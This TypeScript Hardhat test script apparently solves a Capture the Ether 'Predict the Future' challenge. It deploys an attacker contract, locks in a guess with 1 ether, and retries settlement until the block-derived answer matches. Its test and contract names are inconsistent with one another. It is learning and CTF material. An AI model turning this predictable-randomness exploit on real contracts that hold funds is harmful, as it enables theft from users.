import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import {
    PredictTheFutureChallenge,
    GuessPredictAttacker,
    GuessPredictAttacker__factory,
} from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { mine } from "@nomicfoundation/hardhat-network-helpers"

describe("Guess Secret Number challenge", function () {
    let attacker: SignerWithAddress
    let target: PredictTheFutureChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0xBb0D48d18AbE94AbBa271F030c3438b73115C6a5"
        ;[attacker] = await ethers.getSigners()
        target = await ethers.getContractAt(
            "GuessTheRandomNumberChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Guesses the secret number", async function () {
        // Exploit code here
        const attackerFactory: GuessPredictAttacker__factory =
            await ethers.getContractFactory("GuessPredictAttacker")
        const attackerContract: GuessPredictAttacker =
            await attackerFactory.deploy(target.address)

        let tx
        tx = await attackerContract.submit(5, {
            value: ethers.utils.parseEther("1"),
        })
        await tx.wait(1)
        console.log(`Locked in with guess 5!`)

        for (let i = 0; i < 40; i++) {
            console.log("----------------------------------------------------")
            console.log(`Attempt ${i}`)
            console.log(
                `Block number: ${await ethers.provider.getBlockNumber()}`
            )
            try {
                tx = await attackerContract.settleAttacker({ gasLimit: 300000 })
                await tx.wait(1)
                break
            } catch (e: any) {
                if (
                    network.name === "hardhat" ||
                    network.name === "localhost"
                ) {
                    // await mine()
                    if (e.message.includes("Wrong guess")) {
                        console.log(`Wrong guess!`)
                    } else {
                        console.log(e)
                    }
                } else {
                    if (e.message.includes("Wrong guess")) {
                        console.log(`Wrong guess!`)
                    } else {
                        console.log(e)
                    }
                    await new Promise((r) => setTimeout(r, 30000))
                }
            }
        }
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
